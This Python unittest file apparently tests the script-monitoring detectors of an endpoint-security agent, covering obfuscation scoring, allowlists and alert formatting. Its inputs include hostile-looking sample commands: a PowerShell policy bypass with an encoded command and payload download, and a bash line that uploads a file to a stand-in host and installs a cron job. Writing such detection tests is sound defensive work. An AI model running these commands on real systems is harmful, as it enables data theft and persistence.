import hashlib
import os
import sys
import tempfile
import unittest


AGENT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if AGENT_DIR not in sys.path:
    sys.path.insert(0, AGENT_DIR)

from collectors.processes import ProcessCollector


class Sender:
    def __init__(self):
        self.alerts = []

    def enqueue(self, alert):
        self.alerts.append(alert)


class ScriptMonitoringTests(unittest.TestCase):
    def setUp(self):
        self.sender = Sender()
        self.collector = ProcessCollector(self.sender, config={
            'script_monitoring_enabled': True,
            'script_hashing_enabled': True,
            'hash_sha1_enabled': True,
            'hash_md5_enabled': True,
        })

    def test_powershell_context_extracts_path_hash_and_obfuscation(self):
        with tempfile.NamedTemporaryFile(suffix='.ps1', delete=False) as handle:
            handle.write(b'Write-Output test')
            script_path = handle.name
        try:
            context = self.collector._script_context(
                'powershell.exe',
                f'powershell.exe -ExecutionPolicy Bypass -EncodedCommand AAA {script_path}',
                r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
                'WINWORD.EXE',
                1,
            )
            self.assertEqual(context['interpreter'], 'PowerShell')
            self.assertEqual(context['script_path'], script_path)
            self.assertEqual(context['script_hash'], hashlib.sha256(b'Write-Output test').hexdigest())
            self.assertEqual(len(context['script_sha1']), 40)
            self.assertEqual(len(context['script_md5']), 32)
            self.assertGreaterEqual(context['obfuscation_score'], 25)
            self.assertIn('External network connection', context['detection_reasons'])
            self.assertIn('Suspicious or remote parent process', context['detection_reasons'])
        finally:
            os.unlink(script_path)

    def test_cross_platform_script_rules_are_behavioral(self):
        powershell = {finding[0] for finding in self.collector._command_activity(
            'powershell.exe', 'powershell.exe -NoProfile -EncodedCommand AAA Invoke-WebRequest https://example.test/payload',
        )}
        self.assertIn('SCRIPT_EXECUTION_OBSERVED', powershell)
        self.assertIn('SCRIPT_OBFUSCATED_COMMAND', powershell)
        self.assertIn('SCRIPT_DOWNLOAD_EXECUTE', powershell)
        self.assertIn('SCRIPT_POLICY_BYPASS', powershell)

        linux = {finding[0] for finding in self.collector._command_activity(
            'bash', 'bash -c "curl --upload-file /tmp/archive https://example.test && crontab /tmp/job"',
        )}
        self.assertIn('SCRIPT_DATA_EXFILTRATION', linux)
        self.assertIn('SCRIPT_PERSISTENCE', linux)

        remote = {finding[0] for finding in self.collector._command_activity(
            'python3', 'python3 remote.py --target host && ssh admin@host',
        )}
        self.assertIn('SCRIPT_REMOTE_EXECUTION', remote)

    def test_allowlist_requires_exact_hash_or_path_boundary(self):
        digest = 'a' * 64
        collector = ProcessCollector(self.sender, config={
            'script_trusted_hashes': [digest],
            'script_trusted_paths': ['/opt/approved'],
        })
        self.assertTrue(collector._script_allowed({'script_hash': digest, 'script_path': '/tmp/test.sh'}))
        self.assertTrue(collector._script_allowed({'script_path': '/opt/approved/job.sh'}))
        self.assertFalse(collector._script_allowed({'script_path': '/opt/approved-evil/job.sh'}))

    def test_download_behavior_does_not_inflate_obfuscation_score(self):
        context = self.collector._script_context(
            'python3',
            'python3 /tmp/fetch.py https://example.test/payload',
            '/usr/bin/python3',
        )
        self.assertEqual(context['obfuscation_score'], 0)

    def test_script_alert_contains_normalized_capability_and_real_process_tree(self):
        item = {
            'pid': 44, 'ppid': 20, 'name': 'python3', 'parent_name': 'sshd',
            'parent_cmdline': 'sshd: user', 'cmdline': 'python3 /tmp/task.py',
            'exe': '/usr/bin/python3', 'username': 'user', 'interpreter': 'Python',
            'script_name': 'task.py', 'script_path': '/tmp/task.py', 'script_hash': 'b' * 64,
            'script_risk_score': 70, 'detection_reasons': ['Remote script execution'],
        }
        self.collector._send_process_alert('SCRIPT_REMOTE_EXECUTION', 'critical', 'Remote script', item)
        alert = self.sender.alerts[0]
        self.assertEqual(alert['capabilityId'], 21)
        self.assertIn(21, alert['capabilityIds'])
        self.assertEqual(alert['source'], 'script_execution')
        self.assertEqual(alert['script_hash'], 'b' * 64)
        self.assertEqual([node['pid'] for node in alert['process_tree']], [20, 44])
        self.assertEqual(alert['mitre_id'], 'T1021')


if __name__ == '__main__':
    unittest.main()
